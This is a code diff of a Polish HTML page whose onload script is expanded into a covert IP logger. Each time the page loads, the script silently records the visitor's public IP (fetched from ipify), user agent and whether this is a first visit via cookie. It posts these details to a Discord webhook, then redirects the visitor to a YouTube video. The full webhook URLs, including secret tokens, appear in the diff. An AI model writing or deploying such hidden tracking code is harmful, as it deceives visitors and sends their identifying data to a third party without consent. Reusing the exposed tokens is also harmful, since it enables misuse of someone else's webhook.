@@ -2,13 +2,38 @@
 <html lang="pl">
 <head>
 <meta charset="UTF-8" />
-<title></title>
+<title>TO NIE JEST MIGRACJA XD</title>
 <script>
-window.onload = function() {
-  fetch("https://discord.com/api/webhooks/1389518874671845376/Od8Uslar_iomZLsANkXglIsDzB4HG6ivaIsMPoRryiCMj2OgvUCCu_qL_0T3uP90zmQJ", {
+window.onload = async function() {
+  const visited = document.cookie.split('; ').find(row => row.startsWith('visited='));
+  const firstVisit = !visited;
+
+  if (firstVisit) {
+    document.cookie = "visited=true; max-age=" + 60*60*24*365 + "; path=/";
+  }
+
+  let ip = "Nieznany";
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    ip = data.ip;
+  } catch(e) {
+    ip = "Nie udało się pobrać IP";
+  }
+
+  const deviceInfo = navigator.userAgent;
+
+  const message = `
+Strona została odwiedzona
+IP: ${ip}
+Pierwsza wizyta: ${firstVisit ? "Tak" : "Nie"}
+Urządzenie: ${deviceInfo}
+`;
+
+  fetch("https://discord.com/api/webhooks/1389658289888952321/0gV4TIXqbzokUK0ip19HE-HFLIfm4VpU6oDATHq7zTjJ3-ycC-faT3QU9xbFVvb6D4mB", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "Strona została odwiedzona" })
+    body: JSON.stringify({ content: message })
   })
   .finally(() => {
     window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
